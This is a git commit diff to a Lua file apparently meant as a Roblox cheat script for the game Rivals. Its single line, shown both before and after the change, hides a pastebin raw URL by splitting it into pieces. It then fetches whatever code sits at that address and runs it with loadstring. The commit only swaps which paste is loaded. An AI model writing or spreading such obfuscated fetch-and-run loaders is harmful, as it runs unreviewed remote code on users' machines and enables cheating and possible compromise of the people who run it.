59ce38bc13c739c8178afb7be597ff36e19ccc4a
Darkluax-main-account <pradezjj@gmail.com>
2026-05-05 21:44:23 +0800

    Update Many-features-Rivals.lua

--- Many-features-Rivals.lua
+++ Many-features-Rivals.lua
@@ -1,1 +1,1 @@
-local _="https://pastebin"local __=".com/raw/"local ___="FuUXWSAA"(loadstring or load)(game:HttpGet(_..__..___))()
+local _="https://pastebin"local __=".com/raw/"local ___="GrGLmQcz"(loadstring or load)(game:HttpGet(_..__..___))()
